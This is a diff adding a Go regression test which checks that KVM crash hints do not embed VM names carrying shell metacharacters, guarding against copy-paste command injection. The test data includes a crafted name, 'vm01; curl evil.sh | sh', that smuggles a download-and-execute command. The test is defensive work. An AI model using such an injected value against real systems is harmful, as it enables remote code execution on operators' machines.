@@ -335,3 +335,27 @@ func TestCheckKVMVMs_CrashedWithLastLogError(t *testing.T) {
 		t.Errorf("LastLogError must appear in hints, got %v", got[0].Hints)
 	}
 }
+
+// TestCheckKVMVMs_CrashedNameOmitsShellMetachars is a regression test for the
+// shell-metacharacter-injection class (distinct from the ANSI/control-escape
+// class PR #991 fixed): checkKVMVMs used to splice vm.Name unescaped into
+// copy-pasteable "to inspect: virsh console <name>"/"cat ... <name>.log" and
+// "to restart: virsh start <name>" hints. A crafted VM name containing shell
+// metacharacters must never appear verbatim in those hints.
+func TestCheckKVMVMs_CrashedNameOmitsShellMetachars(t *testing.T) {
+	t.Parallel()
+	got := checkKVMVMs(models.KVMInfo{
+		VMs: []models.KVMVM{{
+			Name:  "vm01; curl evil.sh | sh",
+			State: models.KVMCrashed,
+		}},
+	})
+	if len(got) == 0 {
+		t.Fatal("crashed VM must produce a CRIT insight, got none")
+	}
+	for _, h := range got[0].Hints {
+		if strings.Contains(h, "curl evil.sh") {
+			t.Errorf("KVM hint must not embed the raw shell-metacharacter VM name verbatim (copy-paste RCE risk): %q", h)
+		}
+	}
+}
